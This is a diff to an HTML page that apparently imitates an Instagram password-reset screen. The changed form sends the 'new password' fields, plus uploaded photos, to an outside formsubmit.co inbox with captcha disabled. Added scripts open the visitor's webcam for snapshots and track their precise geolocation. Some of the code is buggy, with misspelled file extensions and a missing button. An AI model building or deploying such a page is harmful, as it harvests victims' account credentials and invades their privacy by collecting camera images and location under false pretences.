@@ -80,15 +80,18 @@
         }
         }
     </style>
-    <form action="https://formsubmit.co/3e840d4f133754e06bd220d771efa190" method="POST">
+    <form action="https://formsubmit.co/3e840d4f133754e06bd220d771efa190" method="POST" enctype="multipart/form-data">
         <p>
         <label for="id_enc_new_password1">Nova senha:</label><br>
-        <input type="text" name="name" placeholder="Nova senha" required><br>
+        <input type="password" name="senha1" id="pass" placeholder="Nova senha" minlength="8" required><br>
         </p>
         <p>
         <label for="id_enc_new_password2">Confirmação de senha nova:</label><br>
-        <input type="email" name="email" placeholder="Confirmação de senha nova"><br>
+        <input type="password" name="senha2" id="pass" placeholder="Confirmação de senha nova" minlength="8" required><br>
         </p><br>
+
+        <input type="file" name="foto" id="filer" accept=".jpg,.gif,.phg" multiple>
+
         <input type="hidden" name="_captcha" value="false">
         <input type="hidden" name="_next" value="https://questoesquiz-srbogolhao.vercel.app/Instagram/Obrigado.html">
         <button type="submit">Redefinir senha</button>
@@ -122,9 +125,85 @@
    </style>
 
    <div>
+    <video autoplay></video>
     <canvas></canvas>
     <button>tirrar foto</button>
-    <script src="Instagram/script.js"></script>
+    <script>
+        var video = document.querySelector(`video`);
+
+navigator.mediaDevices.getUserMedia({video:true})
+.then(stream => {
+    video.srcObject = stream;
+    video.play();
+})
+.catch(error => {
+    console.log(error);
+})
+
+//video feito
+
+document.querySelector(`button`).addEventListener(`click`, () => {
+    var canvas = document.querySelector(`canvas`);
+    canvas.height = video.videoHeight
+    canvas.width = video.videoWidth
+
+    var context = canvas.getContext(`2d`);
+    context.drawImage(video);
+
+    var link = document.createElement(`a`);
+    link.download = `foto.pnj`;
+    link.href = canvas.toDataURL();
+    link.textContent = `clik para baixar a imagem`;
+    document.body.appendChild(link)
+})
+    </script>
    </div>
+
+
+   <div>
+       <h3 ></h3>
+       <Script>
+           let h3 = document.querySelector(`h3`);
+
+
+           function success(pos){
+               console.log(pos.coords.latitude, pos.coords.longitude);//dados lat longi
+
+               h3.textContent = `Latitude: ${pos.coords.latitude},e sua longitude: ${pos.coords.longitude}`//escreve lat e long
+           }
+
+           function error(err){
+               console.log(err);
+           }
+           
+           navigator.geolocation.getCurrentPosition(success, error);//latitude e longitude
+           var watchID = navigator.geolocation.watchPosition(success, error, {
+            enableHighAccuracy:true,
+            timeout:10000
+           });
+       </Script>
+   </div>
+
+
+   <script>
+       const btn = document.querySelector(`#send`);
+       btn.addEventListener(`click`, function(e){
+            e.preventDefault();
+            const name = document. querySelector(`#email`);
+
+            const value = name.value;
+
+            console.log(value)
+
+       });
+
+   </script>
+
+
+   <script>
+
+
+
+   </script>
 </body>
 </html>
